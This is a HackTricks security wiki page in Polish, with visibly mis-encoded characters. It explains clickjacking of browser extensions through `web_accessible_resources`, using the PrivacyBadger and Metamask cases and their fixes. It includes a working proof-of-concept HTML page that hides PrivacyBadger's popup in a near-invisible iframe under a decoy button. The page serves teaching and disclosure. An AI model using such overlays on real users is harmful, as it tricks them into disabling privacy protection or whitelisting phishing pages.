# BrowExt - ClickJacking

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Podstawowe informacje

Ta strona bÄ™dzie wykorzystywaÄ‡ lukÄ™ ClickJacking w rozszerzeniu przeglÄ…darki.\
JeÅ›li nie wiesz, czym jest ClickJacking, sprawdÅº:

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

Rozszerzenia zawierajÄ… plik **`manifest.json`**, a ten plik JSON ma pole `web_accessible_resources`. Oto, co mÃ³wiÄ… [dokumenty Chrome](https://developer.chrome.com/extensions/manifest/web\_accessible\_resources):

> Te zasoby bÄ™dÄ… dostÄ™pne na stronie internetowej za poÅ›rednictwem adresu URL **`chrome-extension://[PACKAGE ID]/[PATH]`**, ktÃ³ry moÅ¼na wygenerowaÄ‡ za pomocÄ… **`extension.getURL method`**. Zasoby na liÅ›cie dozwolonych sÄ… serwowane z odpowiednimi nagÅ‚Ã³wkami CORS, wiÄ™c sÄ… dostÄ™pne za poÅ›rednictwem mechanizmÃ³w takich jak XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

**`web_accessible_resources`** w rozszerzeniu przeglÄ…darki nie sÄ… dostÄ™pne tylko przez sieÄ‡; dziaÅ‚ajÄ… rÃ³wnieÅ¼ z wbudowanymi uprawnieniami rozszerzenia. Oznacza to, Å¼e majÄ… zdolnoÅ›Ä‡ do:

* Zmiany stanu rozszerzenia
* Åadowania dodatkowych zasobÃ³w
* Interakcji z przeglÄ…darkÄ… w pewnym zakresie

Jednak ta funkcja stwarza ryzyko bezpieczeÅ„stwa. JeÅ›li zasÃ³b w **`web_accessible_resources`** ma jakÄ…kolwiek istotnÄ… funkcjonalnoÅ›Ä‡, atakujÄ…cy mÃ³gÅ‚by potencjalnie osadziÄ‡ ten zasÃ³b w zewnÄ™trznej stronie internetowej. NieuwaÅ¼ni uÅ¼ytkownicy odwiedzajÄ…cy tÄ™ stronÄ™ mogÄ… nieÅ›wiadomie aktywowaÄ‡ ten osadzony zasÃ³b. Taka aktywacja moÅ¼e prowadziÄ‡ do niezamierzonych konsekwencji, w zaleÅ¼noÅ›ci od uprawnieÅ„ i moÅ¼liwoÅ›ci zasobÃ³w rozszerzenia.

## PrzykÅ‚ad PrivacyBadger

W rozszerzeniu PrivacyBadger zidentyfikowano lukÄ™ zwiÄ…zanÄ… z katalogiem `skin/`, ktÃ³ry zostaÅ‚ zadeklarowany jako `web_accessible_resources` w nastÄ™pujÄ…cy sposÃ³b (sprawdÅº oryginalny [post na blogu](https://blog.lizzie.io/clickjacking-privacy-badger.html)):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Ta konfiguracja prowadziÅ‚a do potencjalnego problemu z bezpieczeÅ„stwem. Konkretnie, plik `skin/popup.html`, ktÃ³ry jest renderowany po interakcji z ikonÄ… PrivacyBadger w przeglÄ…darce, mÃ³gÅ‚ byÄ‡ osadzony w `iframe`. To osadzenie mogÅ‚o byÄ‡ wykorzystane do oszukania uÅ¼ytkownikÃ³w, aby nieÅ›wiadomie kliknÄ™li "WyÅ‚Ä…cz PrivacyBadger dla tej witryny". Taki krok naruszyÅ‚by prywatnoÅ›Ä‡ uÅ¼ytkownika, wyÅ‚Ä…czajÄ…c ochronÄ™ PrivacyBadger i potencjalnie naraÅ¼ajÄ…c uÅ¼ytkownika na zwiÄ™kszone Å›ledzenie. Wizualna demonstracja tego exploit'u jest dostÄ™pna w przykÅ‚adzie wideo ClickJacking pod adresem [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

Aby rozwiÄ…zaÄ‡ tÄ™ lukÄ™, wdroÅ¼ono proste rozwiÄ…zanie: usuniÄ™cie `/skin/*` z listy `web_accessible_resources`. Ta zmiana skutecznie zminimalizowaÅ‚a ryzyko, zapewniajÄ…c, Å¼e zawartoÅ›Ä‡ katalogu `skin/` nie mogÅ‚a byÄ‡ uzyskiwana ani manipulowana za pomocÄ… zasobÃ³w dostÄ™pnych w sieci.

Naprawa byÅ‚a prosta: **usuÅ„ `/skin/*` z `web_accessible_resources`**.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## PrzykÅ‚ad Metamask

A [**post na blogu o ClickJacking w metamask moÅ¼na znaleÅºÄ‡ tutaj**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). W tym przypadku Metamask naprawiÅ‚ lukÄ™, sprawdzajÄ…c, czy protokÃ³Å‚ uÅ¼ywany do uzyskania dostÄ™pu to **`https:`** lub **`http:`** (a nie **`chrome:`** na przykÅ‚ad):

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

**Inny ClickJacking naprawiony** w rozszerzeniu Metamask polegaÅ‚ na tym, Å¼e uÅ¼ytkownicy mogli **KliknÄ…Ä‡, aby dodaÄ‡ do biaÅ‚ej listy**, gdy strona byÅ‚a podejrzana o phishing z powodu `â€œweb_accessible_resourcesâ€: [â€œinpage.jsâ€, â€œphishing.htmlâ€]`. PoniewaÅ¼ ta strona byÅ‚a podatna na Clickjacking, atakujÄ…cy mÃ³gÅ‚ to wykorzystaÄ‡, pokazujÄ…c coÅ› normalnego, aby ofiara kliknÄ™Å‚a, aby dodaÄ‡ jÄ… do biaÅ‚ej listy, nie zauwaÅ¼ajÄ…c tego, a nastÄ™pnie wracajÄ…c do strony phishingowej, ktÃ³ra zostanie dodana do biaÅ‚ej listy.

## PrzykÅ‚ad Steam Inventory Helper

SprawdÅº nastÄ™pujÄ…cÄ… stronÄ™, aby zobaczyÄ‡, jak **XSS** w rozszerzeniu przeglÄ…darki zostaÅ‚o poÅ‚Ä…czone z lukÄ… **ClickJacking**:

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## Referencje

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
* [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
